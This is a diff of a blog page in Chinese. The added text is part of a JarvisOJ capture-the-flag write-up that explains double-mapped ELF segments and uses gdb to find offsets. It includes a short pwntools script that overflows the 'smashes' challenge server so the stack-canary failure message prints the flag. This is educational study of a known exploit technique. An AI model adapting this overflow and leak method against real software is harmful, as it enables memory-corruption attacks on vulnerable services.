+然后文件在内存中就会映射成这样子：</p>
+</blockquote>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg">
+很清楚地看到，以4KB大小分割（linux64bit的默认页大小是0x1000Bytes）文件状态下的数据(代码也是数据),段与段之间会有重叠部分，而系统索性全部映射过来，所以<strong>代码段的最后一页包含了数据段开始部分的副本，而数据段的第一页包含了代码段的最后部分的副本。（如图）</strong>
+由于我们的文件很小，且通过<code>readelf</code>查看段的文件偏移全部小于0x1000
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg">
+且前面几段映射的基址是<code>0x400000</code>,到后面的<code>.init_array</code>段的映射基址是<code>0x600000</code>故我们有理由断定，在内存里面会存在两份<code>.data</code>段和<code>.bss</code>段（其实其他段也会被映射两次）
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg">
+接下来我们实际演示一下用gdb下断点调试，然后找<code>.rodata</code>段里面的数据在内存里面的位置来验证我们的猜想
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg">
+首先随便下个断点，让程序装载就好了
+然后我们寻找<code>.rodata</code>段里面的数据<code>"Thank you, bye!"</code>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg">
+果不其然，位于地址<code>0x40094E</code>的数据
+<code>"Thank you, bye!"</code>在内存里面被映射了两次。
+既然我们猜想实现，那么我们来尝试寻找在<code>.data</code>段里面的<code>PCTF{</code>
+这次我们把断点定在<code>0x40080B</code>处，为的是不让下面的函数将<code>PCTF{</code>破坏掉
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg">
+同样的，我们在内存中(或者说是程序虚拟空间中)找到了两处<code>PCTF{</code>的映射
+所以就算地址<code>0x600D20</code>处的flag被破坏，我们也能在另外一处即地址<code>0x400D20</code>找到一模一样的flag备份
+那么结合我们上面说的用溢出点覆盖栈上的字符串地址<code>argv[0]</code>,然后利Canary被破坏的机制触发<code>___stack_chk_fail</code>函数将flag输出出来
+我们首先得找一下溢出点到<code>argv[0]</code>的偏移
+我们的溢出点，很容易发现在黄色高亮的代码处 <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg">
+然后我们设置两个断点，一个是在<code>0x4007E0</code>即<code>main</code>函数刚开始的传参完毕的地方，第二个是我们溢出点后<code>0x400813</code>处
+首先我们用gdb运行程序来到了第一个断点<code>0x4007E0</code> <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg">
+可以看到<code>char ** argv</code>的值在栈地址<code>0x7fffffffdfa8</code>处，而真正的字符串数组地址是<code>0x7fffffffe078</code>
+然后我们在"name?"后面随便输入了个字符串"test",然后来到第二个断点 <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg">
+得到我们溢出buff的地址在<code>0x7fffffffde60</code>
+所以我们将地址一相减就会得到数据填充偏移<code>0x7fffffffde60-0x7fffffffe078=536</code>
+所以我们这样构造poc:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./smashes&quot;)</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn.jarvisoj.com&quot;</span>, <span class="dv">9877</span>)</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">536</span></span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="bn">0x400d20</span>)</span>
+<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;name?&quot;</span>,payload)</span>
+<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;flag:&quot;</span>,<span class="st">&quot;What ever you want&quot;</span>)</span>
+<span id="cb26-15"><a href="#cb26-15" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
+<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg"></p>
+<p><strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
 
         </div>
 
@@ -764,7 +853,7 @@ pro.interactive()
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2018/02/15/除夕随笔/">除夕随笔</a>
+                <a class="prev" rel="prev" href="/2018/03/18/基于Tk的多线程选课程序/">基于Tk的多线程选课程序</a>
             
             
             <a class="next" rel="next" href="/2018/01/16/PythonGUI模拟TCP／IP解、封包/">PythonGUI模拟TCP／IP解、封包</a>
@@ -788,5 +877,20 @@ pro.interactive()
 <script>hljs.highlightAll();</script>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
